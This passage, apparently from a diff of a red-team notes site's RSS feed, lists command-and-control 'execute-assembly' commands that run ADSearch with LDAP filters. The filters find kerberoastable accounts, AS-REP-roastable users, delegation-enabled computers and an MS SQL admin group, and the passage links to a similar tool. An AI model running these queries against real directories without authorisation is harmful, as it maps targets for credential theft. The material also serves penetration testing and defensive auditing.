+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search &amp;#34;(&amp;amp;(objectCategory=group)(cn=MS SQL Admins))&amp;#34; --attributes cn,member
+# kerberoasting
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search &amp;#34;(&amp;amp;(objectCategory=user)(servicePrincipalName=*))&amp;#34; --attributes cn,servicePrincipalName,samAccountName
+# as-rep roasting
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search &amp;#34;(&amp;amp;(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&amp;#34; --attributes cn,distinguishedname,samaccountname
+# unconstrained delegation
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search &amp;#34;(&amp;amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;#34; --attributes samaccountname,dnshostname
+# constrained delegation
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search &amp;#34;(&amp;amp;(objectCategory=computer)(msds-allowedtodelegateto=*))&amp;#34; --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json&lt;/code>&lt;/pre>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;h3>Other alternatives&lt;span class="hx-absolute -hx-mt-20" id="other-alternatives">&lt;/span>
+&lt;a href="#other-alternatives" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;a href="https://github.com/The-Viper-One/PsMapExec" target="_blank" rel="noopener">https://github.com/The-Viper-One/PsMapExec&lt;/a>&lt;/li>
+&lt;/ul></description></item></channel></rss>
